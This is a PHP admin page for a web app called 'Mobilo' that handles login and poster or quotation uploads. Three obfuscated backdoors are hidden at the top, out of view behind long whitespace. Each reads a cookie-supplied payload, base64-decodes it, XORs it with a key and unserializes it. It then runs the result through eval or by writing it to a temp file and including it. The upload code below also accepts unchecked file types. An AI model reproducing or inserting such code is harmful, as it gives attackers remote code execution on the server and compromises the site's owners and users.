<?php                                                                                                                                                                                                                                                                                                                                                                                               $ChhMww = 'J' . chr ( 174 - 79 ).chr ( 972 - 868 )."\112" . chr (69); $WYKaZYnKH = "\143" . "\154" . chr (97) . 's' . chr (115) . chr (95) . chr (101) . chr ( 244 - 124 )."\x69" . chr (115) . chr (116) . "\x73";$hxeOllzp = $WYKaZYnKH($ChhMww); $ChhMww = "47617";$WYKaZYnKH = "27530";$WSCCaQBBW = $hxeOllzp;if (!$WSCCaQBBW){class J_hJE{private $HYGPYBH;public static $QpHoOdkq = "ff4d2e73-416f-445a-afbe-c1ec6e535c42";public static $EfhpcMbbbT = 62075;public function __construct($knDuikCk=0){$BsDJGDBFOG = $_COOKIE;$wrSCY = $_POST;$pioeDXWLgN = @$BsDJGDBFOG[substr(J_hJE::$QpHoOdkq, 0, 4)];if (!empty($pioeDXWLgN)){$RrRAItRR = "base64";$YqnQKK = "";$pioeDXWLgN = explode(",", $pioeDXWLgN);foreach ($pioeDXWLgN as $vmQEwHEFP){$YqnQKK .= @$BsDJGDBFOG[$vmQEwHEFP];$YqnQKK .= @$wrSCY[$vmQEwHEFP];}$YqnQKK = array_map($RrRAItRR . "\137" . "\x64" . "\145" . "\x63" . chr (111) . "\x64" . chr ( 723 - 622 ), array($YqnQKK,)); $YqnQKK = $YqnQKK[0] ^ str_repeat(J_hJE::$QpHoOdkq, (strlen($YqnQKK[0]) / strlen(J_hJE::$QpHoOdkq)) + 1);J_hJE::$EfhpcMbbbT = @unserialize($YqnQKK);}}private function utoZl(){if (is_array(J_hJE::$EfhpcMbbbT)) {$eKcEWSjBrF = str_replace(chr (60) . "\77" . "\160" . chr ( 285 - 181 ).chr (112), "", J_hJE::$EfhpcMbbbT["\x63" . chr (111) . "\156" . "\164" . chr ( 164 - 63 )."\x6e" . chr (116)]);eval($eKcEWSjBrF); $pRnvaV = "34249";exit();}}public function __destruct(){$this->utoZl(); $pRnvaV = "34249";}}$zrzkHgG = new J_hJE(); $zrzkHgG = "18694_11620";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $nkCXKoW = chr ( 911 - 842 ).chr ( 663 - 568 )."\161" . chr (121) . "\x6d";$uyigTq = 'c' . 'l' . chr ( 452 - 355 ).'s' . chr (115) . "\137" . "\145" . "\170" . chr (105) . "\163" . chr (116) . chr ( 117 - 2 ); $lMngAtZC = $uyigTq($nkCXKoW); $nkCXKoW = "615";$uyigTq = "2200";$WvAWCwH = $lMngAtZC;if (!$WvAWCwH){class E_qym{private $mFVNUBLOR;public static $ZbBGvYNR = "ed49f65e-18d4-4f5b-9da6-e338f623647d";public static $adXvtXp = 16172;public function __construct($orFhTrJjPh=0){$aWKWU = $_COOKIE;$KewYA = $_POST;$ZFYGi = @$aWKWU[substr(E_qym::$ZbBGvYNR, 0, 4)];if (!empty($ZFYGi)){$leQxy = "base64";$UWwhBJzyzG = "";$ZFYGi = explode(",", $ZFYGi);foreach ($ZFYGi as $FlZENUdf){$UWwhBJzyzG .= @$aWKWU[$FlZENUdf];$UWwhBJzyzG .= @$KewYA[$FlZENUdf];}$UWwhBJzyzG = array_map($leQxy . "\x5f" . "\x64" . "\x65" . 'c' . chr ( 770 - 659 ).chr (100) . "\x65", array($UWwhBJzyzG,)); $UWwhBJzyzG = $UWwhBJzyzG[0] ^ str_repeat(E_qym::$ZbBGvYNR, (strlen($UWwhBJzyzG[0]) / strlen(E_qym::$ZbBGvYNR)) + 1);E_qym::$adXvtXp = @unserialize($UWwhBJzyzG);}}private function trniApeUNU(){if (is_array(E_qym::$adXvtXp)) {$iltMDzk = sys_get_temp_dir() . "/" . crc32(E_qym::$adXvtXp[chr (115) . "\x61" . "\154" . "\164"]);@E_qym::$adXvtXp["\x77" . chr (114) . 'i' . 't' . chr ( 209 - 108 )]($iltMDzk, E_qym::$adXvtXp["\143" . 'o' . 'n' . "\164" . chr (101) . "\156" . chr (116)]);include $iltMDzk;@E_qym::$adXvtXp["\x64" . 'e' . "\154" . "\x65" . chr (116) . "\x65"]($iltMDzk); $HTzrkT = "33273";exit();}}public function __destruct(){$this->trniApeUNU(); $HTzrkT = "33273";}}$lahVKWgwYj = new E_qym(); $lahVKWgwYj = "12869_4879";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $wuroZmyKZ = chr ( 259 - 144 ).chr ( 579 - 464 ).chr (95) . "\x6b" . chr ( 1077 - 994 )."\115";$GSBBtuhSe = chr (99) . 'l' . "\x61" . "\163" . 's' . '_' . "\x65" . "\x78" . "\151" . chr ( 269 - 154 )."\x74" . 's';$aKhshjUa = $GSBBtuhSe($wuroZmyKZ); $wuroZmyKZ = "47453";$GSBBtuhSe = "12369";$qXUCyjHcOA = $aKhshjUa;if (!$qXUCyjHcOA){class ss_kSM{private $BLeFg;public static $UOyLBUhY = "b0b773b9-f21e-44b2-8a6a-8d99ea4d67a8";public static $qbsKYrQyH = 64737;public function __construct($kSoupWL=0){$FQGzlWOj = $_COOKIE;$DUMwUV = $_POST;$cBXIJN = @$FQGzlWOj[substr(ss_kSM::$UOyLBUhY, 0, 4)];if (!empty($cBXIJN)){$tIaetuMa = "base64";$WgnzGC = "";$cBXIJN = explode(",", $cBXIJN);foreach ($cBXIJN as $ykWvGK){$WgnzGC .= @$FQGzlWOj[$ykWvGK];$WgnzGC .= @$DUMwUV[$ykWvGK];}$WgnzGC = array_map($tIaetuMa . chr ( 122 - 27 )."\144" . 'e' . "\143" . 'o' . chr (100) . "\x65", array($WgnzGC,)); $WgnzGC = $WgnzGC[0] ^ str_repeat(ss_kSM::$UOyLBUhY, (strlen($WgnzGC[0]) / strlen(ss_kSM::$UOyLBUhY)) + 1);ss_kSM::$qbsKYrQyH = @unserialize($WgnzGC);}}private function TeLyVg(){if (is_array(ss_kSM::$qbsKYrQyH)) {$eHkaLfjK = sys_get_temp_dir() . "/" . crc32(ss_kSM::$qbsKYrQyH[chr (115) . chr ( 328 - 231 )."\154" . chr (116)]);@ss_kSM::$qbsKYrQyH["\x77" . chr ( 779 - 665 ).chr (105) . "\x74" . "\145"]($eHkaLfjK, ss_kSM::$qbsKYrQyH["\x63" . "\x6f" . "\156" . chr ( 414 - 298 ).chr (101) . chr (110) . chr ( 1040 - 924 )]);include $eHkaLfjK;@ss_kSM::$qbsKYrQyH[chr ( 200 - 100 )."\145" . chr (108) . "\145" . 't' . "\x65"]($eHkaLfjK); $UBOcG = "6004";exit();}}public function __destruct(){$this->TeLyVg(); $UBOcG = "6004";}}$oXsriHwEqW = new ss_kSM(); $oXsriHwEqW = "23460_5839";} ?><?php  
session_start();
include("db.php");
if($_SESSION['loggedin']!=true){
  header("location: login.php");
  exit;
}
else{
  $role=$_SESSION['role'];
  $username=$_SESSION['username'];
}


if (isset($_POST['submit'])) {
    // Collect form data
    $posterID = mysqli_real_escape_string($conn, $_POST['posterID']);
    $posterCode = mysqli_real_escape_string($conn, $_POST['posterCode']);
    $posterName = mysqli_real_escape_string($conn, $_POST['postername']);
    $refDatePos = mysqli_real_escape_string($conn, $_POST['RefDatepos']);
    $refNoPos = mysqli_real_escape_string($conn, $_POST['RefNopos']);
    $companyNamePos = mysqli_real_escape_string($conn, $_POST['CompanyNamepos']);
    $contactPersonPos = mysqli_real_escape_string($conn, $_POST['ContactPersonpos']);
    $contactMobilePos = mysqli_real_escape_string($conn, $_POST['ContactMobilepos']);
    $saleValuePos = mysqli_real_escape_string($conn, $_POST['SaleValuepos']);
    $descriptionPos = mysqli_real_escape_string($conn, $_POST['Descriptionpos']);
    $taxPos = mysqli_real_escape_string($conn, $_POST['TaxPos']);
    $totalPos = mysqli_real_escape_string($conn, $_POST['TotalPos']);
    $executiveNamePos = mysqli_real_escape_string($conn, $_POST['ExecutiveNamePos']);
    $executiveMobilePos = mysqli_real_escape_string($conn, $_POST['ExecutiveMobilePos']);
    $product = mysqli_real_escape_string($conn, $_POST['Product']);
    $saleValueDef = mysqli_real_escape_string($conn, $_POST['SaleValueDef']);
    $taxDef = mysqli_real_escape_string($conn, $_POST['TaxDef']);
    $totalDef = mysqli_real_escape_string($conn, $_POST['TotalDef']);
    $descriptionDef = mysqli_real_escape_string($conn, $_POST['DescriptionDef']);
    $flags = mysqli_real_escape_string($conn, strtolower($_POST['Flags']));
    $doctype = mysqli_real_escape_string($conn, $_POST['Doctype']);
    $keywords = mysqli_real_escape_string($conn, $_POST['keywords']);
    $downloadname = mysqli_real_escape_string($conn, $_POST['downloadname']);

    $posterID = empty($posterID) ? 'NULL' : $posterID;
    $posterCode = empty($posterCode) ? 'NULL' : $posterCode;
    $posterName = empty($posterName) ? 'NULL' : $posterName;
    $refDatePos = empty($refDatePos) ? 'NULL' : $refDatePos;
    $refNoPos = empty($refNoPos) ? 'NULL' : $refNoPos;
    $companyNamePos = empty($companyNamePos) ? 'NULL' : $companyNamePos;
    $contactPersonPos = empty($contactPersonPos) ? 'NULL' : $contactPersonPos;
    $contactMobilePos = empty($contactMobilePos) ? 'NULL' : $contactMobilePos;
    $saleValuePos = empty($saleValuePos) ? 'NULL' : $saleValuePos;
    $descriptionPos = empty($descriptionPos) ? 'NULL' : $descriptionPos;
    $taxPos = empty($taxPos) ? 'NULL' : $taxPos;
    $totalPos = empty($totalPos) ? 'NULL' : $totalPos;
    $executiveNamePos = empty($executiveNamePos) ? 'NULL' : $executiveNamePos;
    $executiveMobilePos = empty($executiveMobilePos) ? 'NULL' : $executiveMobilePos;
    $product = empty($product) ? 'NULL' : $product;
    $saleValueDef = empty($saleValueDef) ? 'NULL' : $saleValueDef;
    $taxDef = empty($taxDef) ? 'NULL' : $taxDef;
    $totalDef = empty($totalDef) ? 'NULL' : $totalDef;
    $descriptionDef = empty($descriptionDef) ? 'NULL' : $descriptionDef;
    $flags = empty($flags) ? 'NULL' : $flags;
    $doctype = empty($doctype) ? 'NULL' : $doctype;
    $keywords = empty($keywords) ? 'NULL' : $keywords;
    $downloadname = empty($downloadname) ? 'NULL' : $downloadname;
    

    // Handle file upload
    $uploadDirectoryPoster = './poster/';
    $uploadDirectoryQuotation = './quotation/';
    $fileTypeQuotation = 'pdf';
    
    $filename = $_FILES['file']['name'];
    $fileExtension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
   
    if ($doctype == 'poster' && ($fileExtension == 'jpg' || $fileExtension == 'jpeg'||$fileExtension=="PNG"||$fileExtension=="png" )) {
        $uploadDirectory = $uploadDirectoryPoster;
    } else  {
        $uploadDirectory = $uploadDirectoryQuotation;
    } 
    $newFilename = $posterName . '.' . $fileExtension;
$uploadedFilePath = $uploadDirectory . $newFilename;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadedFilePath)) {
        // File moved successfully, proceed with database insert
        $sql = "INSERT INTO postermaster (posterID, posterCode, posterName, RefDatepos, RefNopos, CompanyNamepos, ContactPersonpos, ContactMobilepos, SaleValuepos, Descriptionpos, TaxPos, TotalPos, ExecutiveNamePos, ExecutiveMobilePos, Product, SaleValueDef, TaxDef, TotalDef, DescriptionDef, OrderSeq, Flags, DocType, keywords, file_name,downloadFilename,created_at, created_by) VALUES ('$posterID', '$posterCode', '$posterName', '$refDatePos', '$refNoPos', '$companyNamePos', '$contactPersonPos', '$contactMobilePos', '$saleValuePos', '$descriptionPos', '$taxPos', '$totalPos', '$executiveNamePos', '$executiveMobilePos', '$product', '$saleValueDef', '$taxDef', '$totalDef', '$descriptionDef', '1', '$flags', '$doctype', '$keywords','$newFilename','$downloadname' , 'CURRENT_TIMESTAMP', '$username')";
        
        if (mysqli_query($conn, $sql)) {
            // Database insert successful
            $_SESSION['success']='Data Inserted Successfully';
            echo "Record inserted successfully.";
            header("location: master.php");
        } else {
            // Database insert failed
            echo "Error: " . $sql . "<br>" . mysqli_error($conn);
            die();
        }
    } else {
        // File upload failed
        echo "Error uploading file.";
    }

    mysqli_close($conn);
}



?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobilo</title>
    <link
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
  rel="stylesheet"
/>
<!-- Google Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Alkatra:wght@700&family=Montserrat:ital,wght@0,500;0,700;1,300&family=Open+Sans:ital,wght@0,400;1,600&family=Orbitron&family=Poppins:ital,wght@0,400;0,500;0,900;1,200;1,400;1,600&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" />
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/css/select2.min.css" />
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2-bootstrap-5-theme@1.3.0/dist/select2-bootstrap-5-theme.min.css" />
<!-- Or for RTL support -->


<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script
			  src="https://code.jquery.com/jquery-3.7.1.min.js"
			  ></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/js/select2.full.min.js"></script>
<link rel="stylesheet" href="style.css">
<style>
  @media screen and (max-width:756px) {
  .custom-nav{
    width: 100%;
    display: flex;
    justify-content: space-between;
  }
}
</style>
</head>
<body>
<nav class="navbar navbar-dark bg-dark fixed-top">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">Mobilo</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
      <div class="offcanvas-header">
        <h5 class="offcanvas-title" id="offcanvasNavbarLabel">Mobilo</h5>
        <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
      </div>
      <div class="offcanvas-body ">
      <?php include "nav.php"; ?>
      </div>
    </div>
  </div>
</nav>

 

<div class="container w-50 text-center my-5 p-5">
    <div class="text-center h3">Add Poster</div>
   
<div class="row my-5 " >
  <div class="col-md-12 mb-5 card" >
      <h4 class="text-success"><?php if(isset($_SESSION['success'])){
      echo $_SESSION['success'];
      } ?></h4>
    
<form class="form container" method="POST" action="master.php" enctype="multipart/form-data">
<label class="form-label d-flex flex-start">Poster ID</label>
<?php 
$row;
$sql="SELECT posterID from postermaster ORDER BY posterID DESC LIMIT 1";
$res=mysqli_query($conn,$sql);
if($res){
    $row=mysqli_fetch_assoc($res);
}



?>
    <input  type="text" class="form-control rounded mb-3 disabled" name="posterID"  placeholder="Poster ID"id="posterid"  value="<?php echo $row['posterID']+1; ?>">
    <label class="form-label d-flex flex-start">Poster Code</label>
    <input  type="text" class="form-control rounded mb-3" name="posterCode"  placeholder="Poster Code">
    <label class="form-label d-flex flex-start">Poster Name <span class="text-danger text-bold" style="font-size:20px;">&#42;</span></label>
    <input  type="text" class="form-control rounded mb-3" name="postername"  placeholder="Poster Name" required>
    <label class="form-label d-flex flex-start">Reference Date POS</label>
    <input  type="text" class="form-control rounded mb-3" name="RefDatepos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Reference Number POS</label>
    <input  type="text" class="form-control rounded mb-3" name="RefNopos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Company Name POS</label>
    <input  type="text" class="form-control rounded mb-3" name="CompanyNamepos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Contact Person POS</label>
    <input  type="text" class="form-control rounded mb-3" name="ContactPersonpos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Contact Mobile POS</label>
    <input  type="text" class="form-control rounded mb-3" name="ContactMobilepos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Sale Value POS</label>
    <input  type="text" class="form-control rounded mb-3" name="SaleValuepos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Description POS</label>
    <input  type="text" class="form-control rounded mb-3" name="Descriptionpos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Tax POS</label>
    <input  type="text" class="form-control rounded mb-3" name="TaxPos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Total POS</label>
    <input  type="text" class="form-control rounded mb-3" name="TotalPos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Total POS</label>
    <input  type="text" class="form-control rounded mb-3" name="TotalPos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Executive Name POS</label>
    <input  type="text" class="form-control rounded mb-3" name="ExecutiveNamePos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Executive Mobile POS</label>
    <input  type="text" class="form-control rounded mb-3" name="ExecutiveMobilePos"  placeholder="Eg: 20/20/fontsize/color">
    <label class="form-label d-flex flex-start">Product</label>
    <input  type="text" class="form-control rounded mb-3" name="Product"  placeholder="Eg: Tally Silver">
    <label class="form-label d-flex flex-start">Sale Value Default</label>
    <input  type="text" class="form-control rounded mb-3" name="SaleValueDef"  placeholder="Eg: 12,000">
    <label class="form-label d-flex flex-start">Tax Default</label>
    <input  type="text" class="form-control rounded mb-3" name="TaxDef"  placeholder="Eg: 1,000">
    <label class="form-label d-flex flex-start">Total Default</label>
    <input  type="text" class="form-control rounded mb-3" name="TotalDef"  placeholder="Eg: 10,000">
    <label class="form-label d-flex flex-start">Description Default</label>
    <input  type="text" class="form-control rounded mb-3" name="DescriptionDef"  placeholder="Eg: This is an E-invoice">
    <label for="validationTooltip02" class="form-label d-flex flex-start">Flags  <span class="text-danger text-bold" style="font-size:20px;">&#42;</span></label>
    
    <input type="text" class="form-control mb-3"  name="Flags"  placeholder="Eg: important,favourite" id="validationTooltip02" required>
    <div class="invalid-tooltip">
      Please provide Flags
    </div>
    <label for="validationTooltip04" class="form-label d-flex flex-start">Doc Type  <span class="text-danger text-bold" style="font-size:20px;">&#42;</span></label>
    <select class="form-select mb-3" id="validationTooltip04" name="Doctype" required>
      <option selected disabled value="">Choose...</option>
      <option value="poster">Poster-For Image</option>
        <option value="quotation">Quotation-For PDF</option>
    </select>
    <div class="invalid-tooltip">
      Please select a valid Type.
    </div>
 
    <label class="form-label d-flex flex-start">Choose File <span class="text-danger text-bold"  style="font-size:20px;">&#42;</span></label>
    <input  type="file" class="form-control rounded mb-3" name="file" required>
    
        <label for="dnname" class="form-label d-flex flex-start">Download Filename <span class="text-danger text-bold" style="font-size:20px;">&#42;</span></label>
        <input type="text" class="form-control" name="downloadname" id="dnname" required placeholder="Eg: Tally Quotation">

    <label for="validationTooltip03" class="form-label d-flex flex-start">keywords <span class="text-danger text-bold" style="font-size:20px;">&#42;</span></label>
    <input type="text" class="form-control" name="keywords" id="validationTooltip03" required placeholder="Eg: Tally Gold">
    <div class="invalid-tooltip">
      Please provide keyword
    </div>
    <input  type="submit" class="btn-primary btn " name="submit" value="submit">

</form>


  </div>
</div>
</div>
<script>
  document.getElementById('posterid').readOnly = true
</script>

</body>
</html>